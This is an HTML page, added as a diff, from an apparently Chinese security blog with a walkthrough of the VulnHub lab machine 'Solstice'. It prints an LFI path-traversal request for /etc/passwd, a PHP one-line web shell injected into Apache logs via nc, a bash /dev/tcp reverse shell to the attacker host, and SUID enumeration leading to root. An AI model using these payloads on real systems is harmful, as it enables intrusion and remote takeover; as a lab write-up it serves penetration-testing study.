@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>vulnhub靶机Solstice - 信息安全实验室</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@400;500;700&family=Albert+Sans:wght@400;500;600&display=swap" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@400;500;700&family=Albert+Sans:wght@400;500;600&display=swap"></noscript>
+<link rel="stylesheet" href="../assets/style.css" media="print" onload="this.media='all'">
+<noscript><link rel="stylesheet" href="../assets/style.css"></noscript>
+</head>
+<body>
+<div class="mk-scanline"></div>
+<div class="mk-container">
+
+<div class="mk-brand fade-up">
+  <span class="mk-mark"></span>
+  <span class="mk-wordmark">// HIMOBRINE</span>
+</div>
+
+<div id="mkNavSentinel"></div>
+
+<div class="mk-nav-wrap" id="mkNavWrap">
+  <nav class="mk-nav">
+    <a href="../index.html" class="mk-nav-link">首页</a>
+    <a href="../tags/list.html?tag=漏洞分析" class="mk-nav-link">漏洞分析</a>
+    <a href="../tags/list.html?tag=安全工具" class="mk-nav-link">安全工具</a>
+    <a href="../tags/list.html?tag=学习笔记" class="mk-nav-link">学习笔记</a>
+    <a href="../tags/list.html?tag=逆向" class="mk-nav-link">逆向</a>
+    <a href="../tags/list.html?tag=调试" class="mk-nav-link">调试</a>
+    <a href="../tags/list.html" class="mk-nav-link">标签归档</a>
+  </nav>
+</div>
+
+<a href="../index.html" class="mk-back-link">[ &larr; ] BACK TO HOME</a>
+
+<article class="mk-bento-tile">
+  <div class="mk-post-date">2023 // 09 / 08</div>
+  <div class="mk-post-title">vulnhub靶机Solstice</div>
+  <div class="mk-post-tags">
+    <a href="../tags/list.html?tag=vulnhub" class="mk-tag" style="background:#10b98122;color:#10b981;border:1px solid #10b98144">vulnhub</a>
+    <a href="../tags/list.html?tag=渗透测试" class="mk-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">渗透测试</a>
+  </div>
+
+  <div class="mk-post-content" >
+
+    <nav class="mk-toc">
+      <span class="mk-toc-title">// 目录</span>
+      <ul>
+        <li class="toc-h4"><a href="#setup">靶场搭建</a></li>
+        <li class="toc-h4"><a href="#info">信息收集</a></li>
+        <li class="toc-h5"><a href="#host-discovery">主机发现</a></li>
+        <li class="toc-h5"><a href="#port-scan">端口扫描</a></li>
+        <li class="toc-h5"><a href="#version-scan">版本信息</a></li>
+        <li class="toc-h4"><a href="#vuln-scan">漏洞扫描</a></li>
+        <li class="toc-h4"><a href="#web-enum">Web 信息收集</a></li>
+        <li class="toc-h4"><a href="#lfi">任意文件读取</a></li>
+        <li class="toc-h4"><a href="#log-poisoning">Apache 日志污染 getshell</a></li>
+        <li class="toc-h4"><a href="#reverse-shell">反弹 Shell</a></li>
+        <li class="toc-h4"><a href="#privesc">权限提升</a></li>
+        <li class="toc-h5"><a href="#flag">获取 Flag</a></li>
+      </ul>
+    </nav>
+
+    <h4 id="setup">靶场搭建</h4>
+    <p>靶机下载地址：<a href="https://download.vulnhub.com/sunset/solstice.ova" target="_blank">https://download.vulnhub.com/sunset/solstice.ova</a></p>
+    <p>下载后使用 VMware 或 VirtualBox 导入即可。攻击机使用 Kali Linux，靶机网络设置为 NAT 模式。</p>
+
+    <h4 id="info">信息收集</h4>
+
+    <h5 id="host-discovery">主机发现</h5>
+    <pre><code>arp-scan -l</code></pre>
+    <p><img loading="lazy" src="../assets/ss_image001.png" alt="arp-scan 主机发现"></p>
+
+    <h5 id="port-scan">端口扫描</h5>
+    <pre><code>nmap --min-rate 10000 -p- 192.168.21.147</code></pre>
+    <p><img loading="lazy" src="../assets/ss_image002.png" alt="nmap 全端口扫描"></p>
+    <p>开放端口较多，整理一下：</p>
+    <pre><code>nmap --min-rate 10000 -p- 192.168.21.147 -oA ports</code></pre>
+    <p><img loading="lazy" src="../assets/ss_image003.png" alt="nmap 结果保存"></p>
+    <p>数据整理：</p>
+    <pre><code>cat ports.nmap | grep open | awk -F '/' '{print $1}' | tr '\n' ','</code></pre>
+    <p><img loading="lazy" src="../assets/ss_image004.png" alt="端口整理"></p>
+
+    <h5 id="version-scan">版本信息</h5>
+    <pre><code>nmap -sV -sU -O -p21,22,25,80,139,445,2121,3128,8593,54787,62524 192.168.21.147</code></pre>
+    <p><img loading="lazy" src="../assets/ss_image005.png" alt="nmap 版本扫描"></p>
+
+    <h4 id="vuln-scan">漏洞扫描</h4>
+    <pre><code>nmap --script=vuln -p21,22,25,80,139,445,2121,3128,8593,54787,62524 192.168.21.147</code></pre>
+    <p><img loading="lazy" src="../assets/ss_image006.png" alt="nmap 漏洞扫描"></p>
+    <p>CVE-2010-1344 资料：</p>
+    <p><img loading="lazy" src="../assets/ss_image007.png" alt="CVE-2010-1344"></p>
+    <p>但该漏洞拒绝登入，没什么用。</p>
+
+    <h4 id="web-enum">Web 信息收集</h4>
+    <p>先看 80 端口：</p>
+    <p><img loading="lazy" src="../assets/ss_image008.png" alt="80 端口页面"></p>
+    <p>啥都没有。注意 Apache 服务，其他端口也可能有 Web：</p>
+    <p><img loading="lazy" src="../assets/ss_image009.png" alt="Apache 服务查看"></p>
+    <p><img loading="lazy" src="../assets/ss_image010.png" alt="其他端口页面"></p>
+    <p>纯白，没有意义。</p>
+    <p>对 8593 端口下手，用 nikto 扫描：</p>
+    <pre><code>nikto -host 192.168.21.147</code></pre>
+    <p><img loading="lazy" src="../assets/ss_image011.png" alt="nikto 扫描"></p>
+    <pre><code>nikto -host http://192.168.21.147/dvwa</code></pre>
+    <p><img loading="lazy" src="../assets/ss_image012.png" alt="nikto dvwa 目录"></p>
+    <p>突破口大概率是 8593，指定端口扫描：</p>
+    <pre><code>nikto -host 192.168.21.147 -p 8593</code></pre>
+    <p><img loading="lazy" src="../assets/ss_image013.png" alt="nikto 8593 扫描 1"></p>
+    <p><img loading="lazy" src="../assets/ss_image014.png" alt="nikto 8593 扫描 2"></p>
+
+    <h4 id="lfi">任意文件读取</h4>
+    <p>发现可能存在任意文件读取漏洞，尝试读取 /etc/passwd：</p>
+    <pre><code>http://192.168.21.147:8593/index.php?book=/../../../../etc/passwd</code></pre>
+    <p><img loading="lazy" src="../assets/ss_image015.png" alt="任意文件读取 passwd"></p>
+    <p>成功读取 /etc/passwd，确认存在 LFI 漏洞。</p>
+
+    <h4 id="log-poisoning">Apache 日志污染 getshell</h4>
+    <p>服务器是 Apache，尝试查看日志文件：</p>
+    <p><img loading="lazy" src="../assets/ss_image016.png" alt="读取 Apache 日志"></p>
+    <p>获取到 PHPSESSID：</p>
+    <pre><code>PHPSESSID=pfkvbugcndb8fglu2i75jlnlsu</code></pre>
+    <p>搜索 PHPSESSID 相关内容：</p>
+    <p><img loading="lazy" src="../assets/ss_image017.png" alt="搜索 PHPSESSID"></p>
+    <p>找到命令执行入口。80 端口有 Apache 服务，直接用 nc 连接写入一句话木马（使用 GET 方式，后续需要在 URL 上反弹 shell）：</p>
+    <pre><code>nc 192.168.21.147 80
+GET&lt;?php system($_GET[herobrine]);?&gt;http/1.1</code></pre>
+    <p><img loading="lazy" src="../assets/ss_image018.png" alt="nc 写入一句话木马"></p>
+
+    <h4 id="reverse-shell">反弹 Shell</h4>
+    <p>利用一句话木马执行反弹 shell（需要 URL 编码）：</p>
+    <pre><code>bash -c 'exec bash -i &>/dev/tcp/192.168.21.146/666 &lt;&amp;1'</code></pre>
+    <p><img loading="lazy" src="../assets/ss_image019.png" alt="反弹 shell 执行"></p>
+    <p>Shell 优化：</p>
+    <pre><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+    <p><img loading="lazy" src="../assets/ss_image020.png" alt="shell 优化"></p>
+
+    <h4 id="privesc">权限提升</h4>
+    <p>信息收集：</p>
+    <p><img loading="lazy" src="../assets/ss_image021.png" alt="信息收集"></p>
+    <p>查找 SUID 文件：</p>
+    <pre><code>find / -user root -perm /4000 2>/dev/null</code></pre>
+    <p><img loading="lazy" src="../assets/ss_image022.png" alt="SUID 文件查找"></p>
+    <p>发现 <code>/tmp/sv</code> 很可疑：</p>
+    <p><img loading="lazy" src="../assets/ss_image023.png" alt="tmp/sv 文件"></p>
+    <p>查看内容：</p>
+    <p><img loading="lazy" src="../assets/ss_image024.png" alt="tmp/sv 内容"></p>
+    <p>找到哪个站点能访问 /var/tmp/sv：</p>
+    <pre><code>ps -ef | grep sv</code></pre>
+    <p><img loading="lazy" src="../assets/ss_image025.png" alt="ps 查找 sv 进程"></p>
+    <p><img loading="lazy" src="../assets/ss_image026.png" alt="sv 服务信息"></p>
+    <p>发现 57 端口有 Web 服务，通过该端口反弹 shell：</p>
+    <p><img loading="lazy" src="../assets/ss_image027.png" alt="57 端口 shell 1"></p>
+    <p><img loading="lazy" src="../assets/ss_image028.png" alt="57 端口 shell 2"></p>
+    <p><img loading="lazy" src="../assets/ss_image029.png" alt="57 端口 shell 3"></p>
+    <p>成功获取 root 权限的反弹 shell：</p>
+    <p><img loading="lazy" src="../assets/ss_image030.png" alt="root shell"></p>
+
+    <h4 id="flag">获取 Flag</h4>
+    <p>分别在 /home/miguel 和 /root 下找到两个 flag：</p>
+    <p><img loading="lazy" src="../assets/ss_image031.png" alt="flag 截图"></p>
+
+  </div>
+</article>
+
+<footer class="mk-footer">
+  <div class="mk-footer-brand"> RHODES ISLAND <span>://</span> SECURITY LAB <span>//</span> BLOG </div>
+  <div class="mk-footer-motto">&gt; 道可道，非常道，名可名，非常名</div>
+  <div class="mk-footer-links">
+    <a href="https://github.com/himobrine/wiki">GitHub</a>
+    <a href="../links.html">友情链接</a>
+    <a href="../index.html">Home</a>
+  </div>
+  <div class="mk-footer-copy">(c) 2026 // SECURITY BLOG</div></footer>
+
+<div class="mk-themedock" id="mkThemeDock">
+  <span class="mk-themedock-item active" data-theme="black">■</span>
+  <span class="mk-themedock-item" data-theme="white">□</span>
+  <span class="mk-themedock-item" data-theme="elysia">◇</span>
+  <span class="mk-themedock-item" data-theme="rei">▽</span>
+</div>
+
+<div class="mk-float-buttons">
+  <button class="mk-float-btn" id="mkThemeToggle" title="切换主题" aria-label="切换主题">■</button>
+  <button class="mk-float-btn" id="mkBackToTop" title="回到顶部" aria-label="回到顶部">⌃</button>
+</div>
+
+<script>
+const tocLinks = document.querySelectorAll('.mk-toc a');
+const tocTargets = [];
+tocLinks.forEach(a => {
+  const id = a.getAttribute('href').slice(1);
+  const el = document.getElementById(id);
+  if (el) tocTargets.push({ el, link: a });
+});
+const tocObs = new IntersectionObserver(
+  (entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const match = tocTargets.find(t => t.el === e.target);
+        if (match) match.link.classList.add('active');
+      }
+    });
+  },
+  { threshold: 0.3, rootMargin: '-80px 0px -40% 0px' }
+);
+tocTargets.forEach(t => tocObs.observe(t.el));
+
+document.querySelectorAll('.mk-post-content pre').forEach(pre => {
+  const wrap = document.createElement('div');
+  wrap.className = 'mk-code-wrap';
+  pre.parentNode.insertBefore(wrap, pre);
+  wrap.appendChild(pre);
+
+  const lines = pre.textContent.split('\n').length;
+
+  const header = document.createElement('div');
+  header.className = 'mk-code-header';
+
+  const info = document.createElement('span');
+  info.className = 'mk-code-info';
+  info.textContent = `CODE // ${lines} line${lines === 1 ? '' : 's'}`;
+
+  const actions = document.createElement('div');
+  actions.className = 'mk-code-actions';
+
+  const copy = document.createElement('button');
+  copy.className = 'mk-code-btn mk-code-btn-copy'; copy.textContent = 'copy';
+  copy.onclick = (e) => {
+    e.stopPropagation();
+    navigator.clipboard.writeText(pre.textContent).then(() => {
+      copy.textContent = 'copied!'; copy.classList.add('copied');
+      setTimeout(() => { copy.textContent = 'copy'; copy.classList.remove('copied'); }, 1500);
+    });
+  };
+
+  const fold = document.createElement('button');
+  fold.className = 'mk-code-btn mk-code-btn-fold'; fold.textContent = '\u2191';
+  fold.onclick = (e) => {
+    e.stopPropagation();
+    wrap.classList.toggle('collapsed');
+    fold.textContent = wrap.classList.contains('collapsed') ? '\u2193' : '\u2191';
+  };
+  wrap.onclick = () => {
+    if (wrap.classList.contains('collapsed')) {
+      wrap.classList.remove('collapsed');
+      fold.textContent = '\u2191';
+    }
+  };
+
+  if (lines > 10) { wrap.classList.add('collapsed'); fold.textContent = '\u2193'; }
+
+  actions.append(copy, fold);
+  header.append(info, actions);
+  wrap.prepend(header);
+});
+</script>
+
+<div class="mk-graph-sidebar" id="mkGraphSidebar">
+  <div class="mk-graph-title"><a href="../graph.html">// 关系图谱</a></div>
+  <div id="graphContainer"></div>
+</div><script>
+(function(){
+var gs=document.getElementById("mkGraphSidebar"),gc=document.getElementById("graphContainer");
+if(!gs||!gc)return;
+var s=document.createElement("script");
+s.src="../assets/vis-network.min.js";
+s.onload=function(){
+  var d=document.createElement("script");
+  d.src="../assets/posts-data.js";
+  d.onload=function(){
+    var p=document.createElement("script");
+    p.textContent="const POSTS=POSTS_DATA.map(function(p){return{title:p.title,date:p.date,url:p.url.replace(\"posts/\",\"\"),excerpt:p.excerpt,tags:p.tags,primary:p.primary,secondary:p.secondary};});";
+    document.body.appendChild(p);
+    var g=document.createElement("script");
+    g.src="../assets/graph.js";
+    document.body.appendChild(g);
+  };
+  document.body.appendChild(d);
+};
+document.body.appendChild(s);
+})();
+</script>
+<script src="../assets/common.js"></script>
+
+</body>
+</html>
